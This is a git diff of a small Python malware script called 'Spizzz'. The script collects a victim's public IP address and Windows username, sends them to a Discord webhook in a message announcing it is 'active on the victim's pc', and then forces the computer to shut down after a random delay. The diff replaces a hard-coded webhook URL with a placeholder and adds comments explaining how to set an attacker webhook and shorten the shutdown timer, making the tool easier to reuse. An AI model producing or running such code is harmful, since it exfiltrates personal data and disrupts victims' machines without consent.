@@ -18,11 +18,13 @@ elif __file__.replace('\\', '/') != path.replace('\\', '/'):
 
 class spizzz :
 
-    ticks = random.randint(300,1800)
+    ticks = random.randint(300,1800) # Change the two random time limits to shut down the pc (example : ticks = random.randint(1,100) | there, the computer will shut down randomly between 1 and 10 seconds)
     ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
     computer_username = getenv("username")
 
-    url = "https://discord.com/api/webhooks/938335348038189056/US8my9PBYkN0TrsN99jazFGgbqfb4G5I4dOrYS1SPrKOAjR15T2fMoUJvN4rvaQvr_Gu"
+
+    url = "YOU WEBHOOKS ADRESS HERE" # Here, put the address of your discord webhooks. (example : https://discord.com/api/webhooks/fullnumbersandletters)
+
 
     embed = {
         "title": "Spizzz is now active on the victim's pc :",
@@ -30,16 +32,16 @@ class spizzz :
         "fields": [
             {
                 "name": "**ShutDown :**",
-                        "value": f"__Extinction dans :__{ticks} secondes",
+                        "value": f"__Shutdown in :__{ticks} seconds",
                         "inline": True
             },
             {
-                "name": "**Infos Supplémentaires :**",
-                        "value": f"__IP:__ {ip}\n__Utilisateur PC:__ {computer_username}",
+                "name": "**Additional Info :**",
+                        "value": f"__IP Adress:__ {ip}\n__PC User :__ {computer_username}",
                         "inline": True
             }
         ],
-        "footer" : {"text" : "Spizz by LikAnda"},
+        "footer" : {"text" : "Spizz, by LikAnda"},
         }
 
     data = {
@@ -58,4 +60,4 @@ class spizzz :
     else:
         print("Payload delivered successfully, code {}.".format(result.status_code))
 
-    os.system(f"shutdown /s /t {ticks}")
+    os.system(f"shutdown /s /t {ticks}") # The shutdown command
